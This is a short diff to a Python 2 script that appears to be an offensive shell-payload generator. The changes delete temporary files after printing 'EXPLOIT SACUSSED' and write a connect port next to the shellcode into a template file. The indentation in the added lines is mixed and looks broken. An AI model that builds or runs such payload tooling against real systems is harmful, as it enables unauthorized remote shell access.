@@ -10,6 +10,7 @@ from Banner import Banner
 import shutil
 import fileinput
 from subprocess import check_output 
+import os
 
 W='\033[0m'     
 R='\033[31m'    
@@ -264,7 +265,9 @@ class LISTEN_BIND():
                         except Exception:
                            print B+"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                            time.sleep(2)
-                           print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W          
+                           print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W    
+                           os.remove('.resource')  
+                           os.remove('.data')       
                            break
              except KeyboardInterrupt:
                    Banner  
@@ -295,7 +298,11 @@ class LISTEN_BIND():
 		            line = line.replace(line,line+ str(self.count) +'\n')
 		        if '_Shell_Code   = ('in line:
 		             line = line.rstrip()
-		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')			     
+		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')	
+                       
+                        if 'connect_Port = 'in line:
+		            line = line.rstrip()
+		            line = line.replace(line,line+ str(self.port)+'\n')  		     
 				
 		        print line,
 		  time.sleep(2)
